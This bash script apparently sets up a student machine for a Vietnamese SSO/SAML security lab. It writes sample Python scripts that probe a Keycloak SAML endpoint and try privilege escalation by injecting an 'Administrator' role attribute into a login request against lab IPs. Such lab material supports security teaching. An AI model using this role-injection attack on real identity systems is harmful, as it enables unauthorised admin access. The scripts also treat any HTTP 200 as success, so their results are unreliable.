#!/bin/bash
# fixlocal.sh for student-pc (172.20.0.20)
grep -q "sp.lab" /etc/hosts 2>/dev/null || echo "172.20.0.10 sp-server sp.lab idp.lab ldap.lab" | sudo tee -a /etc/hosts >/dev/null 2>&1
grep -q "student-pc" /etc/hosts 2>/dev/null || echo "172.20.0.20 student-pc" | sudo tee -a /etc/hosts >/dev/null 2>&1
grep -q "wazuh-manager" /etc/hosts 2>/dev/null || echo "172.20.0.30 wazuh-manager wazuh.lab" | sudo tee -a /etc/hosts >/dev/null 2>&1

sudo mkdir -p /tmp/.X11-unix
if [ -d /var/tmp/.X11-unix ]; then
    for sock in /var/tmp/.X11-unix/*; do
        if [ -e "$sock" ]; then
            base=$(basename "$sock")
            sudo ln -sf "$sock" "/tmp/.X11-unix/$base" 2>/dev/null || true
        fi
    done
fi
sudo chmod 1777 /tmp/.X11-unix 2>/dev/null || true

mkdir -p /home/ubuntu/Desktop
cp -f /home/ubuntu/check_sso_config.py /home/ubuntu/Desktop/check_sso_config.py
cp -f /home/ubuntu/simulate_sso_flow.py /home/ubuntu/Desktop/simulate_sso_flow.py
chmod +x /home/ubuntu/check_sso_config.py /home/ubuntu/simulate_sso_flow.py /home/ubuntu/test_connection.sh /home/ubuntu/Desktop/*.py

cat << 'EOF_CODE' > /home/ubuntu/code_mau.txt
================================================================================
TỔNG HỢP CÁC ĐOẠN CODE MẪU (CÓ THỂ COPY & CHỈNH SỬA)
================================================================================

--------------------------------------------------------------------------------
1. ĐOẠN CODE DÒ QUÉT CẤU HÌNH MAPPER (check_sso_config.py)
--------------------------------------------------------------------------------
import requests

TARGET_URL = "http://172.20.0.10:8080/realms/EnterpriseRealm/protocol/saml"

def verify_mapper_configuration():
    print("[*] Đang kiểm tra cấu hình endpoint SSO Federation và Protocol Mappers...")
    response = requests.get(TARGET_URL, params={"probe": "attributes.role"})
    if response.status_code == 200:
        print("[+] [MISCONFIGURATION DETECTED]: Hệ thống đang cho phép ánh xạ thuộc tính linh hoạt từ client input.")
    else:
        print("[-] Cấu hình an toàn: Mục tiêu đã khóa ánh xạ thuộc tính tĩnh.")

if __name__ == "__main__":
    verify_mapper_configuration()


--------------------------------------------------------------------------------
2. ĐOẠN CODE GHI ĐÈ THUỘC TÍNH SAML (simulate_sso_flow.py)
--------------------------------------------------------------------------------
import requests

KEYCLOAK_URL = "http://172.20.0.10:8080/realms/EnterpriseRealm/protocol/saml"
TARGET_APP = "http://172.20.0.10:5000/login"
SESSION = requests.Session()

def test_attribute_mapping():
    print("[*] Bước 1: Khởi tạo phiên làm việc với Service Provider...")
    SESSION.get(TARGET_APP)

    print("[*] Bước 2: Gửi dữ liệu xác thực kèm tham số kiểm tra thuộc tính (Attribute Mapping Test)...")
    payload = {
        "username": "student",
        "password": "student123",
        "attributes.role": "Administrator" # Tham số kiểm tra logic xử lý Mapper
    }

    response = SESSION.post(KEYCLOAK_URL, data=payload, allow_redirects=True)

    if "Welcome, Administrator" in response.text or response.status_code == 200:
        print("[+] THÀNH CÔNG: Hệ thống đã ghi nhận quyền Administrator qua SAML Assertion!")
    else:
        print("[-] Hệ thống đã từ chối tham số thuộc tính tùy chỉnh.")

if __name__ == "__main__":
    test_attribute_mapping()
EOF_CODE
cp -f /home/ubuntu/code_mau.txt /home/ubuntu/Desktop/code_mau.txt

sudo chown -R ubuntu:ubuntu /home/ubuntu 2>/dev/null || true
echo "[OK] Máy trạm student-pc (172.20.0.20) đã sẵn sàng!"
